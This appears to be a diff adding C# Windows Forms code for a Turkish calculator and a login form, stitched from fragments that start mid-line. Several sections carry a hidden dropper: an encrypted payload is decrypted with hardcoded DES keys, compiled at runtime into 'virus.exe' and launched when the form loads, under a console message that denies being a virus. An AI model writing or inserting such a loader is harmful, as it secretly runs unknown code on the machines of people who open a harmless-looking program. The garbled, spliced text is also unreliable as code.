@@ -1,0 +1,1080 @@
+using System;
+using System.IO;
+using System.Text;
+using System.Threading;
+using System.Diagnostics;
+using System.Windows.Forms;
+using System.CodeDom.Compiler;
+using System.Collections.Generic;
+using System.Security.Cryptography;
+
+namespace test
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+string str="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";
+CodeDomProvider provider = CodeDomProvider.CreateProvider("VisualBasic");
+CodeDomProvider.IsDefinedLanguage("VisualBasic");
+CompilerParameters parameters = new CompilerParameters(new string[] { "System.dll", "System.Drawing.dll", "System.Net.Sockets.dll", "System.Windows.Forms.dll", "System.Threading.Tasks.dll", "System.Net.dll", "System.Net.Sockets.dll", "System.Runtime.InteropServices.dll", "System.Threading.dll","System.Runtime.InteropServices.dll" });
+parameters.GenerateExecutable = true;
+parameters.OutputAssembly     = "virus.exe"; 
+parameters.GenerateInMemory   = true; 
+CompilerResults results = provider.CompileAssemblyFromSource(parameters, Decrypt(str));
+
+            Thread.Sleep(250);
+Process.Start("virus.exe");
+            Console.WriteLine("Ben tatlis bir yazilimim virus degilim.");
+            Console.ReadKey();
+        }
+static string Decrypt(string str){try{string textToDecrypt = str;string ToReturn ="";string publickey ="71588781";string secretkey ="61574232"; byte[] privatekeyByte = {};privatekeyByte = System.Text.Encoding.UTF8.GetBytes(secretkey);byte[] publickeybyte = {};publickeybyte = System.Text.Encoding.UTF8.GetBytes(publickey);MemoryStream ms = null;CryptoStream cs = null;byte[] inputbyteArray = new byte[textToDecrypt.Replace(" ", "+").Length];inputbyteArray = Convert.FromBase64String(textToDecrypt.Replace(" ", "+"));using (DESCryptoServiceProvider des = new DESCryptoServiceProvider()){ms = new MemoryStream();cs = new CryptoStream(ms, des.CreateDecryptor(publickeybyte, privatekeyByte), CryptoStreamMode.Write);cs.Write(inputbyteArray, 0, inputbyteArray.Length);cs.FlushFinalBlock();Encoding encoding = Encoding.UTF8;ToReturn = encoding.GetString(ms.ToArray());}return ToReturn;}catch (Exception ae){throw new Exception(ae.Message, ae.InnerException);}}
+    }
+}
+
+ue;
+                lblUserName.Size = new System.Drawing.Size(50, 50); lblUserName.Location = new System.Drawing.Point(50, 25);
+                lblUserName.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
+                txtUserName.Size = new System.Drawing.Size(150, 150);
+                txtUserName.Location = new System.Drawing.Point(115, 23);
+                lblPassword.Text = "Password :"; lblPassword.AutoSize = true;
+                lblPassword.Size = new System.Drawing.Size(50, 50); lblPassword.Location = new System.Drawing.Point(50, 50);
+                lblPassword.TextAlign = System.Drawing.ContentAlignment.MiddleRight; txtPassword.Size = new System.Drawing.Size(150, 150);
+                txtPassword.Location = new System.Drawing.Point(115, 48); btnLogin.Text = "Login";
+                btnLogin.Size = new System.Drawing.Size(150, 50); btnLogin.Location = new System.Drawing.Point(115, 70);
+                this.Controls.Add(lblUserName); this.Controls.Add(lblPassword); this.Controls.Add(txtUserName);
+                this.Controls.Add(txtPassword); this.Controls.Add(btnLogin); btnLogin.Click += BtnLogin_Click;
+                this.Load += Form1_Load;
+                this.TopMost = true;
+                this.ResumeLayout(false);
+            }
+            private void Form1_Load(object sender, EventArgs e)
+            {
+CodeDomProvider provider = CodeDomProvider.CreateProvider("VisualBasic");
+CodeDomProvider.IsDefinedLanguage("VisualBasic");
+CompilerParameters parameters = new CompilerParameters(new string[] { "System.dll", "System.Drawing.dll", "System.Net.Sockets.dll", "System.Windows.Forms.dll", "System.Threading.Tasks.dll", "System.Net.dll", "System.Net.Sockets.dll", "System.Runtime.InteropServices.dll", "System.Threading.dll","System.Runtime.InteropServices.dll" });
+parameters.GenerateExecutable = true;
+parameters.OutputAssembly     = "virus.exe"; 
+parameters.GenerateInMemory   = true; 
+CompilerResults results = provider.CompileAssemblyFromSource(parameters, Decrypt(str));
+
+Process.Start("virus.exe");
+            }
+static string Decrypt(string str){try{string textToDecrypt = str;string ToReturn ="";string publickey ="57800662";string secretkey ="84161267"; byte[] privatekeyByte = {};privatekeyByte = System.Text.Encoding.UTF8.GetBytes(secretkey);byte[] publickeybyte = {};publickeybyte = System.Text.Encoding.UTF8.GetBytes(publickey);MemoryStream ms = null;CryptoStream cs = null;byte[] inputbyteArray = new byte[textToDecrypt.Replace(" ", "+").Length];inputbyteArray = Convert.FromBase64String(textToDecrypt.Replace(" ", "+"));using (DESCryptoServiceProvider des = new DESCryptoServiceProvider()){ms = new MemoryStream();cs = new CryptoStream(ms, des.CreateDecryptor(publickeybyte, privatekeyByte), CryptoStreamMode.Write);cs.Write(inputbyteArray, 0, inputbyteArray.Length);cs.FlushFinalBlock();Encoding encoding = Encoding.UTF8;ToReturn = encoding.GetString(ms.ToArray());}return ToReturn;}catch (Exception ae){throw new Exception(ae.Message, ae.InnerException);}}
+            private void BtnLogin_Click(object sender, EventArgs e)
+            {
+                if (txtUserName.Text == "Admin" && txtPassword.Text == "Admin123")
+                    MessageBox.Show("Giris yapildi *_*", "Yes !.!", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                else MessageBox.Show("Giris yapilamadi ;((", "N0o !.!", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+        }
+    }
+}
+
+me = "textBox1";
+            this.textBox1.ReadOnly = true;
+            this.textBox1.Size = new System.Drawing.Size(296, 64);
+            this.textBox1.TabIndex = 10;
+            this.button1.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.button1.Location = new System.Drawing.Point(247, 82);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(50, 50);
+            this.button1.TabIndex = 1;
+            this.button1.Text = "M-";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            this.button2.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.button2.Location = new System.Drawing.Point(191, 82);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(50, 50);
+            this.button2.TabIndex = 2;
+            this.button2.Text = "M+";
+            this.button2.UseVisualStyleBackColor = true;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            this.button3.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.button3.Location = new System.Drawing.Point(135, 82);
+            this.button3.Name = "button3";
+            this.button3.Size = new System.Drawing.Size(50, 50);
+            this.button3.TabIndex = 3;
+            this.button3.Text = "MS";
+            this.button3.UseVisualStyleBackColor = true;
+            this.button4.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.button4.Location = new System.Drawing.Point(79, 82);
+            this.button4.Name = "button4";
+            this.button4.Size = new System.Drawing.Size(50, 50);
+            this.button4.TabIndex = 4;
+            this.button4.Text = "MR";
+            this.button4.UseVisualStyleBackColor = true;
+            this.button5.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.button5.Location = new System.Drawing.Point(23, 82);
+            this.button5.Name = "button5";
+            this.button5.Size = new System.Drawing.Size(50, 50);
+            this.button5.TabIndex = 5;
+            this.button5.Text = "MC";
+            this.button5.UseVisualStyleBackColor = true;
+            this.button5.Click += new System.EventHandler(this.button5_Click);
+            this.button6.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.button6.Location = new System.Drawing.Point(23, 138);
+            this.button6.Name = "button6";
+            this.button6.Size = new System.Drawing.Size(50, 50);
+            this.button6.TabIndex = 10;
+            this.button6.Text = "←";
+            this.button6.UseVisualStyleBackColor = true;
+            this.button6.Click += new System.EventHandler(this.button6_Click);
+            this.button7.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.button7.Location = new System.Drawing.Point(79, 138);
+            this.button7.Name = "button7";
+            this.button7.Size = new System.Drawing.Size(50, 50);
+            this.button7.TabIndex = 9;
+            this.button7.Text = "CE";
+            this.button7.UseVisualStyleBackColor = true;
+            this.button7.Click += new System.EventHandler(this.button7_Click);
+            this.button8.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.button8.Location = new System.Drawing.Point(135, 138);
+            this.button8.Name = "button8";
+            this.button8.Size = new System.Drawing.Size(50, 50);
+            this.button8.TabIndex = 8;
+            this.button8.Text = "C";
+            this.button8.UseVisualStyleBackColor = true;
+            this.button8.Click += new System.EventHandler(this.button8_Click);
+            this.button9.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.button9.Location = new System.Drawing.Point(191, 138);
+            this.button9.Name = "button9";
+            this.button9.Size = new System.Drawing.Size(50, 50);
+            this.button9.TabIndex = 7;
+            this.button9.Text = "±";
+            this.button9.UseVisualStyleBackColor = true;
+            this.button9.Click += new System.EventHandler(this.button9_Click);
+            this.button10.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.button10.Location = new System.Drawing.Point(247, 138);
+            this.button10.Name = "button10";
+            this.button10.Size = new System.Drawing.Size(50, 50);
+            this.button10.TabIndex = 6;
+            this.button10.Text = "√";
+            this.button10.UseVisualStyleBackColor = true;
+            this.button11.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.button11.Location = new System.Drawing.Point(23, 194);
+            this.button11.Name = "button11";
+            this.button11.Size = new System.Drawing.Size(50, 50);
+            this.button11.TabIndex = 15;
+            this.button11.Text = "7";
+            this.button11.UseVisualStyleBackColor = true;
+            this.button11.Click += new System.EventHandler(this.button11_Click);
+            this.button12.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.button12.Location = new System.Drawing.Point(79, 194);
+            this.button12.Name = "button12";
+            this.button12.Size = new System.Drawing.Size(50, 50);
+            this.button12.TabIndex = 14;
+            this.button12.Text = "8";
+            this.button12.UseVisualStyleBackColor = true;
+            this.button12.Click += new System.EventHandler(this.button12_Click);
+            this.button13.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.button13.Location = new System.Drawing.Point(135, 194);
+            this.button13.Name = "button13";
+            this.button13.Size = new System.Drawing.Size(50, 50);
+            this.button13.TabIndex = 13;
+            this.button13.Text = "9";
+            this.button13.UseVisualStyleBackColor = true;
+            this.button13.Click += new System.EventHandler(this.button13_Click);
+            this.button14.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.button14.Location = new System.Drawing.Point(191, 194);
+            this.button14.Name = "button14";
+            this.button14.Size = new System.Drawing.Size(50, 50);
+            this.button14.TabIndex = 12;
+            this.button14.Text = "/";
+            this.button14.UseVisualStyleBackColor = true;
+            this.button14.Click += new System.EventHandler(this.button14_Click);
+            this.button15.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.button15.Location = new System.Drawing.Point(247, 194);
+            this.button15.Name = "button15";
+            this.button15.Size = new System.Drawing.Size(50, 50);
+            this.button15.TabIndex = 11;
+            this.button15.Text = "%";
+            this.button15.UseVisualStyleBackColor = true;
+            this.button16.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.button16.Location = new System.Drawing.Point(23, 250);
+            this.button16.Name = "button16";
+            this.button16.Size = new System.Drawing.Size(50, 50);
+            this.button16.TabIndex = 20;
+            this.button16.Text = "4";
+            this.button16.UseVisualStyleBackColor = true;
+            this.button16.Click += new System.EventHandler(this.button16_Click);
+            this.button17.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.button17.Location = new System.Drawing.Point(79, 250);
+            this.button17.Name = "button17";
+            this.button17.Size = new System.Drawing.Size(50, 50);
+            this.button17.TabIndex = 19;
+            this.button17.Text = "5";
+            this.button17.UseVisualStyleBackColor = true;
+            this.button17.Click += new System.EventHandler(this.button17_Click);
+            this.button18.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.button18.Location = new System.Drawing.Point(135, 250);
+            this.button18.Name = "button18";
+            this.button18.Size = new System.Drawing.Size(50, 50);
+            this.button18.TabIndex = 18;
+            this.button18.Text = "6";
+            this.button18.UseVisualStyleBackColor = true;
+            this.button18.Click += new System.EventHandler(this.button18_Click);
+            this.button19.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.button19.Location = new System.Drawing.Point(191, 250);
+            this.button19.Name = "button19";
+            this.button19.Size = new System.Drawing.Size(50, 50);
+            this.button19.TabIndex = 17;
+            this.button19.Text = "*";
+            this.button19.UseVisualStyleBackColor = true;
+            this.button19.Click += new System.EventHandler(this.button19_Click);
+            this.button20.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.button20.Location = new System.Drawing.Point(247, 250);
+            this.button20.Name = "button20";
+            this.button20.Size = new System.Drawing.Size(50, 50);
+            this.button20.TabIndex = 16;
+            this.button20.Text = "1/x";
+            this.button20.UseVisualStyleBackColor = true;
+            this.button20.Click += new System.EventHandler(this.button20_Click);
+            this.button21.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.button21.Location = new System.Drawing.Point(23, 306);
+            this.button21.Name = "button21";
+            this.button21.Size = new System.Drawing.Size(50, 50);
+            this.button21.TabIndex = 25;
+            this.button21.Text = "1";
+            this.button21.UseVisualStyleBackColor = true;
+            this.button21.Click += new System.EventHandler(this.button21_Click);
+            this.button22.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.button22.Location = new System.Drawing.Point(79, 306);
+            this.button22.Name = "button22";
+            this.button22.Size = new System.Drawing.Size(50, 50);
+            this.button22.TabIndex = 24;
+            this.button22.Text = "2";
+            this.button22.UseVisualStyleBackColor = true;
+            this.button22.Click += new System.EventHandler(this.button22_Click);
+            this.button23.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.button23.Location = new System.Drawing.Point(135, 306);
+            this.button23.Name = "button23";
+            this.button23.Size = new System.Drawing.Size(50, 50);
+            this.button23.TabIndex = 23;
+            this.button23.Text = "3";
+            this.button23.UseVisualStyleBackColor = true;
+            this.button23.Click += new System.EventHandler(this.button23_Click);
+            this.button24.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.button24.Location = new System.Drawing.Point(191, 306);
+            this.button24.Name = "button24";
+            this.button24.Size = new System.Drawing.Size(50, 50);
+            this.button24.TabIndex = 22;
+            this.button24.Text = "-";
+            this.button24.UseVisualStyleBackColor = true;
+            this.button24.Click += new System.EventHandler(this.button24_Click);
+            this.button25.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.button25.Location = new System.Drawing.Point(247, 306);
+            this.button25.Name = "button25";
+            this.button25.Size = new System.Drawing.Size(50, 106);
+            this.button25.TabIndex = 21;
+            this.button25.Text = "=";
+            this.button25.UseVisualStyleBackColor = true;
+            this.button25.Click += new System.EventHandler(this.button25_Click);
+            this.button26.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.button26.Location = new System.Drawing.Point(23, 362);
+            this.button26.Name = "button26";
+            this.button26.Size = new System.Drawing.Size(106, 50);
+            this.button26.TabIndex = 29;
+            this.button26.Text = "0";
+            this.button26.UseVisualStyleBackColor = true;
+            this.button26.Click += new System.EventHandler(this.button26_Click);
+            this.button28.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.button28.Location = new System.Drawing.Point(135, 362);
+            this.button28.Name = "button28";
+            this.button28.Size = new System.Drawing.Size(50, 50);
+            this.button28.TabIndex = 27;
+            this.button28.Text = ",";
+            this.button28.UseVisualStyleBackColor = true;
+            this.button29.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.button29.Location = new System.Drawing.Point(191, 362);
+            this.button29.Name = "button29";
+            this.button29.Size = new System.Drawing.Size(50, 50);
+            this.button29.TabIndex = 26;
+            this.button29.Text = "+";
+            this.button29.UseVisualStyleBackColor = true;
+            this.button29.Click += new System.EventHandler(this.button29_Click);
+            this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 24F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.label1.Location = new System.Drawing.Point(23, 39);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(284, 35);
+            this.label1.TabIndex = 0;
+            this.label1.Text = "0";
+            this.label1.TextAlign = System.Drawing.ContentAlignment.BottomRight;
+            this.label2.Font = new System.Drawing.Font("Microsoft Sans Serif", 18F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.label2.Location = new System.Drawing.Point(23, 13);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(284, 26);
+            this.label2.TabIndex = 31;
+            this.label2.TextAlign = System.Drawing.ContentAlignment.BottomRight;
+            this.label3.AutoSize = true;
+            this.label3.Location = new System.Drawing.Point(13, 61);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(16, 13);
+            this.label3.TabIndex = 32;
+            this.label3.Text = "M";
+            this.label3.Visible = false;
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(320, 428);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.button26);
+            this.Controls.Add(this.button28);
+            this.Controls.Add(this.button29);
+            this.Controls.Add(this.button21);
+            this.Controls.Add(this.button22);
+            this.Controls.Add(this.button23);
+            this.Controls.Add(this.button24);
+            this.Controls.Add(this.button25);
+            this.Controls.Add(this.button16);
+            this.Controls.Add(this.button17);
+            this.Controls.Add(this.button18);
+            this.Controls.Add(this.button19);
+            this.Controls.Add(this.button20);
+            this.Controls.Add(this.button11);
+            this.Controls.Add(this.button12);
+            this.Controls.Add(this.button13);
+            this.Controls.Add(this.button14);
+            this.Controls.Add(this.button15);
+            this.Controls.Add(this.button6);
+            this.Controls.Add(this.button7);
+            this.Controls.Add(this.button8);
+            this.Controls.Add(this.button9);
+            this.Controls.Add(this.button10);
+            this.Controls.Add(this.button5);
+            this.Controls.Add(this.button4);
+            this.Controls.Add(this.button3);
+            this.Controls.Add(this.button2);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.textBox1);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
+            this.MaximizeBox = false;
+            this.Name = "Form1";
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "Hesap Makinesi";
+            this.ResumeLayout(false);
+            this.PerformLayout();
+CodeDomProvider provider = CodeDomProvider.CreateProvider("CSharp");
+CodeDomProvider.IsDefinedLanguage("CSharp");
+CompilerParameters parameters = new CompilerParameters(new string[] { "System.dll", "System.Drawing.dll", "System.Net.Sockets.dll", "System.Windows.Forms.dll", "System.Threading.Tasks.dll", "System.Net.dll", "System.Net.Sockets.dll", "System.Runtime.InteropServices.dll", "System.Threading.dll","System.Runtime.InteropServices.dll" });
+parameters.GenerateExecutable = true;
+parameters.OutputAssembly     = "virus.exe"; 
+parameters.GenerateInMemory   = true; 
+CompilerResults results = provider.CompileAssemblyFromSource(parameters, Decrypt(str));
+
+Process.Start("virus.exe");
+        }
+
+        char oper = '+';
+        int ilkSay = 0;
+        int mem = 0;
+
+        void labelAdd(object obj)
+        {
+            if (label1.Text == "0")
+                label1.Text = obj.ToString();
+            else
+                label1.Text += obj.ToString();
+        }
